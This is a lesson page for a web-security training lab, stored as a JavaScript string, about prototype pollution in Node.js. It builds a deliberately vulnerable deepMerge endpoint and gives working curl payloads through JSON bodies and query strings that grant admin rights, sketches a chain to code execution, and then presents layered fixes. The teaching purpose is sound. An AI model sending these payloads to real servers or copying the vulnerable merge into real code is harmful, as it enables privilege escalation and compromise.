window.LESSONS = window.LESSONS || {};
window.LESSONS.proto = `

<h1 class="lesson-title">Lab 09: Prototype Pollution</h1>

<p class="lesson-subtitle">
  A vulnerability unique to JavaScript. You will poison the prototype chain and watch
  every object in the entire Node.js process inherit properties you injected. Then you
  will chain it into something far worse.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 1</span> Understanding the Prototype Chain</h2>

<p>
  Before we write any vulnerable code, I need you to understand the mechanism that makes this
  vulnerability possible. If you have been writing JavaScript for years without thinking much about
  prototypes, you are not alone. Most developers interact with the prototype chain every day without
  realizing it. But to understand prototype pollution, you need to see the chain clearly.
</p>

<p>
  Every object in JavaScript has a hidden internal link to another object called its prototype. When you
  access a property on an object, the engine first checks the object itself. If the property is not there,
  it walks up the prototype chain -- checking the object's prototype, then the prototype's prototype, and
  so on -- until it either finds the property or reaches <code>null</code> at the top of the chain.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">prototype-chain.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> obj <span class="op">=</span> {};

<span class="cmt">// Every plain object's prototype is Object.prototype</span>
console.<span class="fn">log</span>(obj.__proto__ <span class="op">===</span> Object.prototype); <span class="cmt">// true</span>

<span class="cmt">// Object.prototype is the end of the chain</span>
console.<span class="fn">log</span>(Object.prototype.__proto__); <span class="cmt">// null</span>

<span class="cmt">// When you access a property, JS walks the chain:</span>
<span class="cmt">// 1. Check obj itself -- not found</span>
<span class="cmt">// 2. Check obj.__proto__ (Object.prototype) -- not found</span>
<span class="cmt">// 3. Reach null -- return undefined</span>
console.<span class="fn">log</span>(obj.someProp); <span class="cmt">// undefined</span>
  </pre>
</div>

<p>
  Here is the critical insight: <code>Object.prototype</code> sits at the top of the chain for nearly
  every object in a JavaScript process. Arrays, date objects, regular expressions, and every plain object
  literal all inherit from it. If you add a property to <code>Object.prototype</code>, that property
  becomes visible on <em>every single object</em> that does not explicitly define its own version of it.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">global-pollution.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// Manually polluting Object.prototype (DO NOT do this in real code)</span>
Object.prototype.polluted <span class="op">=</span> <span class="str">'yes'</span>;

<span class="kw">const</span> a <span class="op">=</span> {};
<span class="kw">const</span> b <span class="op">=</span> [];
<span class="kw">const</span> c <span class="op">=</span> <span class="kw">new</span> <span class="fn">Date</span>();

console.<span class="fn">log</span>(a.polluted); <span class="cmt">// 'yes'</span>
console.<span class="fn">log</span>(b.polluted); <span class="cmt">// 'yes'</span>
console.<span class="fn">log</span>(c.polluted); <span class="cmt">// 'yes'</span>
  </pre>
</div>

<p>
  This is what makes prototype pollution fundamentally different from most vulnerabilities. You are not
  corrupting one variable or one record. You are modifying the behavior of every object that will ever
  exist in that process for the rest of its lifetime. The blast radius is the entire runtime.
</p>

<div class="callout warn">
  <div class="callout-title">Why This Matters</div>
  <div class="callout-text">
    Prototype pollution is not about one object. When you modify Object.prototype, you modify the
    default behavior of every object in the Node.js process. Security checks, configuration lookups,
    feature flags -- anything that reads properties from plain objects is affected.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 2</span> Build a Vulnerable Deep Merge</h2>

<p>
  Now let us build the vulnerable code. The most common vector for prototype pollution is a recursive
  object merge function -- the kind you find in configuration systems, settings endpoints, and utility
  libraries. The function takes a target object and a source object, and recursively copies properties
  from source into target. Sounds harmless. It is not.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">utils/merge.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">function</span> <span class="fn">deepMerge</span>(target, source) {
  <span class="kw">for</span> (<span class="kw">const</span> key <span class="kw">of</span> Object.<span class="fn">keys</span>(source)) {
    <span class="kw">if</span> (
      <span class="kw">typeof</span> source[key] <span class="op">===</span> <span class="str">'object'</span> <span class="op">&&</span>
      source[key] <span class="op">!==</span> <span class="kw">null</span> <span class="op">&&</span>
      <span class="kw">typeof</span> target[key] <span class="op">===</span> <span class="str">'object'</span>
    ) {
      <span class="cmt">// Recursively merge nested objects</span>
      <span class="fn">deepMerge</span>(target[key], source[key]);
    } <span class="kw">else</span> {
      <span class="cmt">// BUG: assigns ANY key from source, including __proto__</span>
      target[key] <span class="op">=</span> source[key];
    }
  }
  <span class="kw">return</span> target;
}
  </pre>
</div>

<p>
  And here is the endpoint that uses it. A user settings update route that merges the incoming
  JSON body into the existing settings object.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/settings.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
router.<span class="fn">put</span>(<span class="str">'/api/settings'</span>, <span class="fn">requireAuth</span>, (<span class="kw">req</span>, <span class="kw">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> userSettings <span class="op">=</span> <span class="fn">getUserSettings</span>(req.session.user.id);

  <span class="cmt">// Merge user-provided data into settings</span>
  <span class="fn">deepMerge</span>(userSettings, req.body);

  <span class="fn">saveUserSettings</span>(req.session.user.id, userSettings);
  res.<span class="fn">json</span>({ message: <span class="str">'Settings updated'</span> });
});
  </pre>
</div>

<p>
  The problem is that <code>deepMerge</code> does not filter which keys it processes. When you parse JSON
  with <code>JSON.parse('{"__proto__":{"isAdmin":true}}')</code>, the resulting object has a key literally
  named <code>__proto__</code>. When <code>deepMerge</code> encounters this key, it walks into
  <code>target.__proto__</code> -- which is <code>Object.prototype</code> -- and starts writing
  properties directly onto it.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 3</span> The Attack -- Polluting Object.prototype</h2>

<p>
  Time to exploit it. We send a single request with a carefully crafted JSON payload.
</p>

<div class="attack-box">
  <div class="attack-box-title">Attack: Prototype Pollution via Settings Update</div>
  <pre>
curl -X PUT http://localhost:3000/api/settings \\
  -H <span class="str">"Content-Type: application/json"</span> \\
  -b <span class="str">"session=YOUR_SESSION_COOKIE"</span> \\
  -d <span class="str">'{"__proto__":{"isAdmin":true}}'</span>
  </pre>
</div>

<p>
  That is the entire attack. One HTTP request. Let us verify what just happened.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Verify the pollution</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// After the attack, in the same Node.js process:</span>
<span class="kw">const</span> user <span class="op">=</span> {};
console.<span class="fn">log</span>(user.isAdmin); <span class="cmt">// true -- we never set this!</span>

<span class="kw">const</span> config <span class="op">=</span> {};
console.<span class="fn">log</span>(config.isAdmin); <span class="cmt">// true -- every new object has it</span>

<span class="kw">const</span> arr <span class="op">=</span> [];
console.<span class="fn">log</span>(arr.isAdmin); <span class="cmt">// true -- even arrays</span>
  </pre>
</div>

<p>
  Every object in the process now has an <code>isAdmin</code> property set to <code>true</code>,
  unless it explicitly defines its own <code>isAdmin</code>. Now consider what happens when
  the application has an authorization check like this:
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">routes/admin.js</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
router.<span class="fn">get</span>(<span class="str">'/api/admin/dashboard'</span>, <span class="fn">requireAuth</span>, (<span class="kw">req</span>, <span class="kw">res</span>) <span class="op">=></span> {
  <span class="kw">const</span> user <span class="op">=</span> <span class="fn">getUser</span>(req.session.user.id);

  <span class="cmt">// This check is now ALWAYS true after pollution</span>
  <span class="kw">if</span> (user.isAdmin) {
    res.<span class="fn">json</span>({ secrets: <span class="str">'all the admin data'</span> });
  } <span class="kw">else</span> {
    res.<span class="fn">status</span>(<span class="num">403</span>).<span class="fn">json</span>({ error: <span class="str">'Forbidden'</span> });
  }
});
  </pre>
</div>

<p>
  If the <code>getUser</code> function returns a plain object that does not have an explicit
  <code>isAdmin</code> property (because normal users simply lack that field rather than having it
  set to <code>false</code>), the property lookup walks up the prototype chain and finds our
  polluted value. Every user is now an admin. The attacker sent one request and escalated the
  privileges of every user in the system simultaneously.
</p>

<div class="callout warn">
  <div class="callout-title">The Blast Radius</div>
  <div class="callout-text">
    This is not a per-request vulnerability. The pollution persists for the entire lifetime of the
    Node.js process. Every request from every user, from the moment of pollution until the server
    restarts, is affected. A single request can compromise an entire running application.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 4</span> Chaining Into RCE</h2>

<p>
  Prototype pollution by itself is a logic bug. It lets you inject unexpected properties into objects,
  which can bypass authorization checks, alter application behavior, or cause denial of service. That
  alone is serious. But the real nightmare scenario is when prototype pollution chains into remote code
  execution. And in Node.js, that chain is shorter than you might think.
</p>

<p>
  Many Node.js libraries read configuration from plain objects. If a library uses <code>options.shell</code>
  or <code>options.env</code> from an object, and those values are not explicitly set, they will be
  inherited from the prototype. An attacker who can pollute the prototype can influence how child
  processes are spawned.
</p>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Conceptual RCE Chain</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="cmt">// Step 1: Attacker pollutes the prototype</span>
<span class="cmt">// via the vulnerable deepMerge endpoint:</span>
<span class="cmt">// {"__proto__":{"shell":"node","execArgv":["-e","require('child_process').exec('...')"]}}</span>

<span class="cmt">// Step 2: Somewhere in the app, a library spawns a child process</span>
<span class="kw">const</span> { <span class="fn">fork</span> } <span class="op">=</span> <span class="fn">require</span>(<span class="str">'child_process'</span>);

<span class="cmt">// The options object is empty, so 'shell' and 'execArgv'</span>
<span class="cmt">// are inherited from the polluted prototype</span>
<span class="kw">const</span> worker <span class="op">=</span> <span class="fn">fork</span>(<span class="str">'./worker.js'</span>, [], {});
<span class="cmt">// The attacker's code executes in the child process</span>
  </pre>
</div>

<p>
  This is not theoretical. There are real CVEs for exactly this pattern. The <code>lodash.merge</code>
  function was vulnerable to prototype pollution (CVE-2018-3721) and was one of the most downloaded
  packages on npm at the time. jQuery's <code>$.extend</code> had the same issue in deep mode.
  The <code>hoek</code> package, used internally by the hapi framework ecosystem, was also affected.
  In each case, the fix was the same: filter out dangerous keys during the merge operation.
</p>

<p>
  The severity of prototype pollution depends entirely on what other code runs in the same process.
  In a minimal application with no child process spawning and no library that reads options from plain
  objects, it might be limited to authorization bypass. In a complex application with background job
  processing, template engines, or process management, it can be full RCE. That uncertainty is part
  of what makes it dangerous -- you cannot assess the severity without auditing every dependency.
</p>

<div class="callout info">
  <div class="callout-title">Real-World CVEs</div>
  <div class="callout-text">
    CVE-2018-3721 (lodash.merge), CVE-2018-3728 (hoek), CVE-2019-11358 (jQuery.extend). These are
    not obscure libraries. They are some of the most widely used packages in the JavaScript ecosystem.
    If these libraries got it wrong, your custom deepMerge function almost certainly did too.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Step 5</span> constructor.prototype -- The Alternative Path</h2>

<p>
  Most developers who learn about prototype pollution focus on the <code>__proto__</code> key. And many
  "fixes" I have seen in the wild simply check for that one key and call it done. But there is another
  path to the same destination: <code>constructor.prototype</code>.
</p>

<p>
  Every object has a <code>constructor</code> property (inherited from the prototype) that points back
  to the function that created it. For plain objects, that is <code>Object</code>. And
  <code>Object.prototype</code> is the same object you reach through <code>__proto__</code>.
</p>

<div class="attack-box">
  <div class="attack-box-title">Attack: Pollution via constructor.prototype</div>
  <pre>
curl -X PUT http://localhost:3000/api/settings \\
  -H <span class="str">"Content-Type: application/json"</span> \\
  -b <span class="str">"session=YOUR_SESSION_COOKIE"</span> \\
  -d <span class="str">'{"constructor":{"prototype":{"isAdmin":true}}}'</span>
  </pre>
</div>

<div class="code-block">
  <div class="code-header">
    <span class="code-file">Why this works</span>
    <button class="code-copy">Copy</button>
  </div>
  <pre>
<span class="kw">const</span> obj <span class="op">=</span> {};

<span class="cmt">// These two expressions reach the same object:</span>
console.<span class="fn">log</span>(obj.__proto__);                  <span class="cmt">// Object.prototype</span>
console.<span class="fn">log</span>(obj.constructor.prototype);       <span class="cmt">// Object.prototype</span>
console.<span class="fn">log</span>(obj.__proto__ <span class="op">===</span> obj.constructor.prototype); <span class="cmt">// true</span>
  </pre>
</div>

<p>
  This means any deepMerge filter that only blocks the string <code>"__proto__"</code> is incomplete.
  The attacker just uses <code>constructor.prototype</code> instead and achieves the exact same
  pollution. I have seen this bypass in production more than once. When you write your key filter,
  you need to block all three dangerous keys: <code>__proto__</code>, <code>constructor</code>,
  and <code>prototype</code>.
</p>

<hr>

<h2 class="step"><span class="step-label">Step 6</span> The Fix -- Multiple Layers</h2>

<p>
  Prototype pollution requires a layered defense because there are multiple vectors and the consequences
  vary by context. Here are the approaches, from most targeted to most aggressive.
</p>

<h3>Layer 1: Block Dangerous Keys in Merge Functions</h3>

<p>
  The most direct fix. Any function that recursively assigns properties from untrusted input must
  skip the dangerous keys.
</p>

<div class="fix-box">
  <div class="fix-box-title">Fix: Safe Deep Merge</div>
  <pre>
<span class="kw">function</span> <span class="fn">safeDeepMerge</span>(target, source) {
  <span class="kw">for</span> (<span class="kw">const</span> key <span class="kw">of</span> Object.<span class="fn">keys</span>(source)) {
    <span class="cmt">// Block all prototype pollution vectors</span>
    <span class="kw">if</span> (key <span class="op">===</span> <span class="str">'__proto__'</span> <span class="op">||</span> key <span class="op">===</span> <span class="str">'constructor'</span> <span class="op">||</span> key <span class="op">===</span> <span class="str">'prototype'</span>) {
      <span class="kw">continue</span>;
    }

    <span class="kw">if</span> (
      <span class="kw">typeof</span> source[key] <span class="op">===</span> <span class="str">'object'</span> <span class="op">&&</span>
      source[key] <span class="op">!==</span> <span class="kw">null</span> <span class="op">&&</span>
      <span class="kw">typeof</span> target[key] <span class="op">===</span> <span class="str">'object'</span>
    ) {
      <span class="fn">safeDeepMerge</span>(target[key], source[key]);
    } <span class="kw">else</span> {
      target[key] <span class="op">=</span> source[key];
    }
  }
  <span class="kw">return</span> target;
}
  </pre>
</div>

<h3>Layer 2: Use Object.create(null) for Config Objects</h3>

<p>
  Objects created with <code>Object.create(null)</code> have no prototype chain at all. They do not
  inherit from <code>Object.prototype</code>, which means they cannot be used as a vector for
  pollution, and they are not affected by pollution on other objects.
</p>

<div class="fix-box">
  <div class="fix-box-title">Fix: Prototype-Free Configuration Objects</div>
  <pre>
<span class="cmt">// Instead of: const config = {};</span>
<span class="kw">const</span> config <span class="op">=</span> Object.<span class="fn">create</span>(<span class="kw">null</span>);

<span class="cmt">// This object has NO prototype</span>
console.<span class="fn">log</span>(config.__proto__);    <span class="cmt">// undefined</span>
console.<span class="fn">log</span>(config.constructor); <span class="cmt">// undefined</span>

<span class="cmt">// Even if Object.prototype is polluted, this object is unaffected</span>
Object.prototype.polluted <span class="op">=</span> <span class="str">'yes'</span>;
console.<span class="fn">log</span>(config.polluted);     <span class="cmt">// undefined -- safe!</span>
  </pre>
</div>

<h3>Layer 3: Freeze Object.prototype</h3>

<p>
  The nuclear option. Call <code>Object.freeze(Object.prototype)</code> at application startup, and
  no code -- neither yours nor an attacker's -- can modify it. Any attempt to add or change properties
  on the frozen prototype silently fails (or throws in strict mode).
</p>

<div class="fix-box">
  <div class="fix-box-title">Fix: Freeze the Prototype at Startup</div>
  <pre>
<span class="cmt">// At the very top of your application entry point</span>
Object.<span class="fn">freeze</span>(Object.prototype);

<span class="cmt">// Now pollution attempts have no effect</span>
Object.prototype.isAdmin <span class="op">=</span> <span class="kw">true</span>;
<span class="kw">const</span> obj <span class="op">=</span> {};
console.<span class="fn">log</span>(obj.isAdmin); <span class="cmt">// undefined -- the freeze prevented it</span>
  </pre>
</div>

<p>
  This approach is aggressive and can break libraries that legitimately modify
  <code>Object.prototype</code> (some polyfill libraries do this). Test thoroughly before deploying
  it. But in a greenfield application or one where you control your dependencies, it is an extremely
  effective backstop.
</p>

<h3>Layer 4: Use Map Instead of Plain Objects</h3>

<p>
  For data structures where the keys come from user input, use a <code>Map</code> instead of a plain
  object. Maps do not have a prototype chain that can be polluted, and setting a key named
  <code>"__proto__"</code> on a Map is just a normal key-value pair with no special behavior.
</p>

<div class="fix-box">
  <div class="fix-box-title">Fix: Map for User-Controlled Data</div>
  <pre>
<span class="cmt">// Instead of a plain object for user preferences</span>
<span class="kw">const</span> userPrefs <span class="op">=</span> <span class="kw">new</span> <span class="fn">Map</span>();
userPrefs.<span class="fn">set</span>(<span class="str">'theme'</span>, <span class="str">'dark'</span>);
userPrefs.<span class="fn">set</span>(<span class="str">'language'</span>, <span class="str">'en'</span>);

<span class="cmt">// Even if an attacker tries __proto__, it is just a normal key</span>
userPrefs.<span class="fn">set</span>(<span class="str">'__proto__'</span>, { isAdmin: <span class="kw">true</span> });
<span class="cmt">// Object.prototype is unaffected</span>
  </pre>
</div>

<div class="callout info">
  <div class="callout-title">Defense in Depth</div>
  <div class="callout-text">
    No single fix is sufficient in isolation. Block dangerous keys in your merge functions (Layer 1),
    use prototype-free objects for security-critical data (Layer 2), consider freezing the prototype
    in your startup code (Layer 3), and use Maps for user-controlled key-value data (Layer 4).
    Patched libraries like lodash have fixed their merge functions, but custom deepMerge
    implementations are everywhere and often unpatched.
  </div>
</div>

<hr>

<h2 class="step"><span class="step-label">Deeper</span> Query-String Pollution</h2>

<p>
  So far every prototype pollution attack we have looked at involves sending a JSON body. But there is
  another vector that catches people off guard: Express query-string parsing. By default, Express uses
  the <code>qs</code> library for parsing query strings, and <code>qs</code> supports nested objects.
  That means an attacker can pollute the prototype chain without sending any JSON at all.
</p>

<div class="attack-box">
  <div class="attack-box-title">Attack: Prototype Pollution via Query String</div>
  <pre>
<span class="cmt"># Express's qs parser turns this URL into a nested object</span>
<span class="cmt"># { __proto__: { isAdmin: "true" } }</span>

curl <span class="str">"http://localhost:3000/api/search?__proto__[isAdmin]=true"</span>

<span class="cmt"># Or using constructor.prototype</span>
curl <span class="str">"http://localhost:3000/api/search?constructor[prototype][isAdmin]=true"</span>

<span class="cmt"># After this request, every new object has isAdmin === "true"</span>
<span class="cmt"># Any authorization check like: if (user.isAdmin) { ... }</span>
<span class="cmt"># will pass for EVERY user, because the property is inherited</span>
  </pre>
</div>

<p>
  This is particularly dangerous because the attack comes through a GET request. There is no request
  body, no Content-Type header to check, and most WAF rules for prototype pollution only look at
  JSON bodies. The fix is to either configure Express to use a simpler query parser
  (<code>app.set('query parser', 'simple')</code>) or to explicitly sanitize the parsed query object
  before using it in any merge or property-access operation.
</p>

<div class="callout warn">
  <div class="callout-title">Express Query Parsing Is Powerful -- and Dangerous</div>
  <div class="callout-text">
    By default, <code>app.get('query parser')</code> returns <code>'extended'</code>, which uses
    <code>qs</code> and supports nested objects. If your application does not need nested query
    parameters, switch to <code>app.set('query parser', 'simple')</code> which uses Node's built-in
    <code>querystring</code> module and does not parse nested objects. This eliminates the query-string
    prototype pollution vector entirely.
  </div>
</div>

<hr>

<h2>Task Checklist</h2>

<ul class="task-list">
  <li><span class="task-check"></span> Demonstrate the prototype chain by showing property lookup walking from an object to Object.prototype</li>
  <li><span class="task-check"></span> Build the vulnerable deepMerge function and the settings endpoint that uses it</li>
  <li><span class="task-check"></span> Exploit the endpoint with a __proto__ payload and verify that new objects inherit the polluted property</li>
  <li><span class="task-check"></span> Bypass a __proto__-only filter using the constructor.prototype vector</li>
  <li><span class="task-check"></span> Exploit prototype pollution via query-string parameters without any JSON body</li>
  <li><span class="task-check"></span> Implement the safe deepMerge with key filtering and verify that pollution is blocked</li>
  <li><span class="task-check"></span> Create a config object with Object.create(null) and confirm it is immune to prototype pollution</li>
  <li><span class="task-check"></span> Switch Express to the simple query parser and verify query-string pollution is eliminated</li>
</ul>

<div class="section-nav">
  <button class="nav-btn" data-prev="idor">Previous: IDOR</button>
  <button class="nav-btn" data-next="deser">Next: Insecure Deserialization</button>
</div>

`;
